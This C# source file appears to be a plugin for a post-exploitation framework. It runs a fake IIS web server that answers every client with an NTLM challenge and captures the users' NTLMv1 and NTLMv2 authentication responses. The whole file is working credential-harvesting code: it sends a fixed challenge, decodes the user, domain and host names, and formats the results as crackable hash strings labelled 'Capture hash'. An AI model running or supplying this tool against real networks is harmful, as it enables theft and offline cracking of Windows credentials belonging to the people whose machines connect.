using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;
using System.IO;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using PluginBase;

namespace Plugin
{
    class FarmerServer
    {
        private TcpListener _listener;

        public void Initialize(int port)
        {
            _listener = new TcpListener(System.Net.IPAddress.Any, port);
            _listener.Start();

            ThreadPool.QueueUserWorkItem(this.ListenerWorker, null);
        } // End Initialize
        public void Stop()
        {
            if (_listener != null)
            {
                _listener.Stop();
                _listener = null;
            }
        } // End Stop

        private void ListenerWorker(object token)
        {
            // incoming client connection

            while (_listener != null)
            {
                try
                {
                    var client = _listener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(this.HandleClientWorker, client);
                }
                catch (Exception e)
                {
                    PluginHandler.WriteOutput(e.ToString(), Config.task_id, true, "error");
                }
            }
        } // End ListenerWorker
        // some bits of this are borrowed from GetNTLM internal tool by xpn
        private void HandleClientWorker(object token)
        {
            try
            {
                var client = token as TcpClient;

                var stream = client.GetStream();
                using (var reader = new StreamReader(stream))
                {
                    var writer = new StreamWriter(stream);
                    var requestFinished = 0;
                    var method = "";
                    var uri = "";
                    var httpver = "";
                    var state = 0;

                    var headers = new Dictionary<string, string>();

                    while (requestFinished == 0)
                    {
                        if (state == 0)
                        {
                            // read the incoming request
                            var lineInput = reader.ReadLine();
                            var line = lineInput.Split(' ');
                            method = line[0];
                            uri = line[1];
                            httpver = line[2];
                            state = 1;
                        }
                        else
                        {
                            var lineInput = reader.ReadLine();
                            if (lineInput == "")
                            {
                                requestFinished = 1;
                                var body = "";
                                var response = HandleWebRequest(method, uri, httpver, headers, body);

                                writer.Write(response);
                                writer.Flush();
                                // Wait to slow things down then close socket
                                Thread.Sleep(3000);
                                client.Close();
                            }
                            else
                            {
                                string[] line = lineInput.Split(':');
                                headers.Add(line[0].Trim().ToLower(), line[1].TrimStart());
                            }
                        }
                    }// end while
                } // end streamreader using
            }
            catch (Exception e)
            {
                if (e.ToString().Contains("WSACancelBlockingCall"))
                {
                    PluginHandler.WriteOutput("Server Stopped", Config.task_id, true);
                }
                else
                {
                    PluginHandler.WriteOutput(e.ToString(), Config.task_id, true, "error");

                }
                this.Stop();
            }
        } // End HandleClientWorker

        private static string HandleWebRequest(string method, string uri, string httpVersion, Dictionary<string, string> headers, string body)
        {
            if (headers.ContainsKey("authorization") == false)
            {
                return "HTTP/1.0 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM\r\nX-Powered-By: ASP.NET\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";

            }
            else if (headers.ContainsKey("authorization"))
            {
                // Received auth response
                var auth = headers["authorization"].Split();
                if (auth[0] == "NTLM")
                {
                    auth[1] = auth[1].TrimStart();
                    byte[] NTLMHash = System.Convert.FromBase64String(auth[1]);
                    if (NTLMHash[8] == 3)
                    {
                        StringBuilder sb = new StringBuilder();
                        var NTLMHashString = DecodeNTLM(NTLMHash);
                        sb.AppendLine("[*] Capture hash:");
                        sb.AppendLine(NTLMHashString);
                        PluginHandler.WriteOutput(sb.ToString(), Config.task_id, false);
                        return "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: Close\r\nContent-Length: 11\r\n\r\nNot Found\r\n";
                    }
                }
            }
            // Send NTLM Challenge Response
            return "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";
        } // End HandleWebRequest

        private static string DecodeNTLM(byte[] NTLM)
        {
            var LMHash_len = BitConverter.ToInt16(NTLM, 12);
            var LMHash_offset = BitConverter.ToInt16(NTLM, 16);
            var LMHash = NTLM.Skip(LMHash_offset).Take(LMHash_len).ToArray();
            var NTHash_len = BitConverter.ToInt16(NTLM, 20);
            var NTHash_offset = BitConverter.ToInt16(NTLM, 24);
            var NTHash = NTLM.Skip(NTHash_offset).Take(NTHash_len).ToArray();
            var User_len = BitConverter.ToInt16(NTLM, 36);
            var User_offset = BitConverter.ToInt16(NTLM, 40);
            var User = NTLM.Skip(User_offset).Take(User_len).ToArray();
            var UserString = System.Text.Encoding.Unicode.GetString(User);

            if (NTHash_len == 24)
            {  // NTLMv1
                var HostName_len = BitConverter.ToInt16(NTLM, 46);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);
                var LMHashString = BitConverter.ToString(LMHash.ToArray()).Replace("-", "");
                var NTHashString = BitConverter.ToString(NTHash.ToArray()).Replace("-", "");
                return UserString + "::" + HostNameString + ":" + LMHashString + ":" + NTHashString + ":1122334455667788";
            }
            else if (NTHash_len > 24)
            { // NTLMv2
                NTHash_len = 64;
                var Domain_len = BitConverter.ToInt16(NTLM, 28);
                var Domain_offset = BitConverter.ToInt16(NTLM, 32);
                var Domain = NTLM.Skip(Domain_offset).Take(Domain_len).ToArray();
                var DomainString = System.Text.Encoding.Unicode.GetString(Domain);
                var HostName_len = BitConverter.ToInt16(NTLM, 44);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);

                var NTHash_part1 = System.BitConverter.ToString(NTHash.Take(16).ToArray()).Replace("-", "");
                var NTHash_part2 = BitConverter.ToString(NTHash.Skip(16).Take(NTLM.Length).ToArray()).Replace("-", "");
                var retval = UserString + "::" + DomainString + ":1122334455667788:" + NTHash_part1 + ":" + NTHash_part2;
                return retval;
            }
            return "";
        }// End DecodeNTLM

    }
}
